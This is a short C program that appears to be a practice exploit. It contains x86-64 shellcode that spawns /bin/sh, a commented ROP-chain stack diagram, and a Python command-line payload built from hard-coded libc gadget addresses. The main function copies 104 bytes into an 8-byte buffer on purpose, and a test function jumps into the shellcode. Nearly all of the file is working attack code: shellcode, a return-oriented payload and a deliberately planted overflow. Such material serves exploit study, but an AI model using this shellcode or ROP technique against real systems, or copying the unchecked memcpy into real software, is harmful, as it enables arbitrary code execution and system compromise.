#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode2[] =
"\xeb\x27\x5b\x48\x89\x5b\x08\x48\x31\xc0\x88\x63\x07\x48\x89\x43\x10\x89\xc2"
"\xb0\x3b\x48\x8b\x7b\x08\x48\x8d\x73\x08\x0f\x05\x48\x31\xc9\x48\x89\xcf\xb0"
"\x3c\x0f\x05\xe8\xd4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20";
//
// |					|
// +--------------------+<-----Top of stack.
// |<space for buffer>	|
// +--------------------+
// |<padding of buffer> |
// +--------------------+
// |<base pointer>		|
// +--------------------+
// |<addr of pop %rsi>	|
// +--------------------+
// |		0x1000		|
// +--------------------+
// |<addr of pop %rdx>	|
// +--------------------+
// |		0x6			|
// +--------------------+
// |<addr of pop %rdi>	|
// +--------------------+
// |		addr		|
// +--------------------+
// |<addr of pop %rax>	|
// +--------------------+
// |<addr of jmp *%rax> |
// +--------------------+
// |<addr of test>		|
// +--------------------+
// |					|
// |					|

/*
Argument : "$(python -c 'print   "A"*16
								 +"B"*8
								 +"\x4d\x88\xa6\xf7\xff\x7f\x20\x20"
								 +"\x20\x10\x20\x20\x20\x20\x20\x20"
								 +"\xe0\x1e\xad\xf7\xff\x7f\x20\x20"
								 +"\x06\x20\x20\x20\x20\x20\x20\x20"
								 +"\xe8\xbf\xa5\xf7\xff\x7f\x20\x20"
								 +"\x20\x10\x60\x20\x20\x20\x20\x20"
								 +"\x58\xd8\xa5\xf7\xff\x7f\x20\x20"
								 +"\x20\x9a\xb0\xf7\xff\x7f\x20\x20"
								 +"\xb3\xd8\xbb\xf7\xff\x7f\x20\x20"
								 +"\xb7\x06\x40\x20\x20\x20\x20\x20"
								 ')"
*/

int main(int argc,char **argv)
{
	char buffer[8];
	memcpy(buffer,argv[1],104);
	memset(buffer+30,0,3);
	memset(buffer+34,0,6);
	memset(buffer+46,0,2);
	memset(buffer+49,0,7);
	memset(buffer+62,0,3);
	memset(buffer+67,0,5);
	memset(buffer+78,0,2);
	memset(buffer+86,0,2);
	memset(buffer+94,0,2);
	memset(buffer+99,0,5);
}

void test()
{
	void (*funcptr)();
	funcptr = shellcode2;
	(*funcptr)();
}
